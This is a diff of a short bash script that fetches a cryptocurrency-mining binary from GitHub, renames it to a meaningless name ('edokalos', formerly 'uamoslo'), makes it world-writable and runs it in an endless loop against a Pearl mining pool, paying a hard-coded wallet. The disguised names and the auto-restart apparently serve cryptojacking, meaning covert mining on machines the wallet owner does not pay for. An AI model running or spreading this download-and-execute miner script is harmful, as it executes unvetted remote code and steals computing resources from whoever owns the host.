@@ -1,5 +1,6 @@
 #!/bin/bash
-wget https://github.com/0xHashRaptor/ForgeMiner/releases/download/v1.4.1/ForgeMiner-1.4.1-linux.tar.gz
-tar xzf ForgeMiner-1.4.1-linux.tar.gz
-mv forge uamoslo
-./uamoslo --algorithm pearlhash --pool prl.kryptex.network:7048 --wallet prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch.$(echo $RANDOM | md5sum | head -c 10)
+wget -O edokalos https://github.com/peakminer/peakminer/releases/download/v2.0.1/peakminer-2.0.1-linux-x86_64
+chmod 777 edokalos
+while :; do
+./edokalos --coin pearl -o stratum+tcp://prl.kryptex.network:7048 -u prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch/$(echo $RANDOM | md5sum | head -c 10)
+done
